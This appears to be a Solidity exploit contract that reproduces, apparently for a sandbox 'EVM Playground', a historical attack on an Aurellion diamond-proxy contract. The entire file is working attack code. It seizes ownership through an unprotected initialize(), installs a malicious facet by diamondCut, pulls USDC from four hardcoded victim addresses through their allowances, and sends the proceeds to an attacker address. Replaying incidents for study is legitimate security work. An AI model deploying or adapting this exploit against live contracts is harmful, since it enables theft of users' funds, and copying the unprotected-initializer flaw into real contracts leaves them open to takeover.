// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone synthetic exploit for the EVM Playground.
// Mirrors the historical CREATE attack path (AurellionLabs_exp.sol / tx 0x19cb…)
// without Foundry cheatcodes: re-init diamond → deploy pull/sweep facet →
// diamondCut → pullERC20 victims → sweepERC20 → transfer profit to attacker EOA.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface ISafeOwnable {
    function initialize(address newOwner) external;
    function owner() external view returns (address);
}

interface IDiamondCut {
    enum FacetCutAction {
        Add,
        Replace,
        Remove
    }

    struct FacetCut {
        address facetAddress;
        FacetCutAction action;
        bytes4[] functionSelectors;
    }

    function diamondCut(FacetCut[] calldata _diamondCut, address _init, bytes calldata _calldata) external;
}

interface IPullSweep {
    function pullERC20(address token, address from, uint256 amount) external;
    function sweepERC20(address token, address to) external;
}

/// @dev Installed via diamondCut; runs as diamond via delegatecall (address(this) = diamond).
contract AurellionPullSweepFacet {
    function pullERC20(address token, address from, uint256 amount) external {
        require(IERC20(token).transferFrom(from, address(this), amount), "pull failed");
    }

    function sweepERC20(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        require(IERC20(token).transfer(to, bal), "sweep failed");
    }
}

contract AurellionExploit {
    address constant ATTACKER = 0x9F49591a3bf95B49cD8d9477b4481Ce9da68d5Ca;
    address constant DIAMOND = 0x0Adc63e71B035d5c7FDB1B4593999FA1F296f1B2;
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;

    address constant V1 = 0x2e933518068b1CFC9746d94762Ef2EDDD39c6048;
    address constant V2 = 0xa90714a15D6e5C0EB3096462De8dc4B22E01589A;
    address constant V3 = 0xEceD2D37e5EDCFc67ffB74c655416F893d20793E;
    address constant V4 = 0x4ce01902536e07AD12FebCb6ce9801C4D86b87C7;

    /// @notice Recorded playground entrypoint.
    function attack() external {
        // 1) Re-init: open initialize() on SafeOwnable facet seizes diamond ownership.
        ISafeOwnable(DIAMOND).initialize(address(this));

        // 2) Deploy malicious facet + cut pull/sweep selectors onto the diamond.
        AurellionPullSweepFacet facet = new AurellionPullSweepFacet();
        bytes4[] memory sels = new bytes4[](2);
        sels[0] = IPullSweep.sweepERC20.selector; // 0x582515c7
        sels[1] = IPullSweep.pullERC20.selector; // 0xe4e832fe

        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](1);
        cuts[0] = IDiamondCut.FacetCut({
            facetAddress: address(facet),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: sels
        });
        IDiamondCut(DIAMOND).diamondCut(cuts, address(0), "");

        // 3) Pull USDC from allowance holders into the diamond.
        _pullIfAny(V1);
        _pullIfAny(V2);
        _pullIfAny(V3);
        _pullIfAny(V4);

        // 4) Sweep diamond balance to this contract, then to attacker EOA.
        IPullSweep(DIAMOND).sweepERC20(USDC, address(this));
        uint256 profit = IERC20(USDC).balanceOf(address(this));
        require(profit > 0, "no profit");
        require(IERC20(USDC).transfer(ATTACKER, profit), "xfer to attacker failed");
    }

    function _pullIfAny(address victim) internal {
        uint256 bal = IERC20(USDC).balanceOf(victim);
        if (bal == 0) return;
        IPullSweep(DIAMOND).pullERC20(USDC, victim, bal);
    }
}
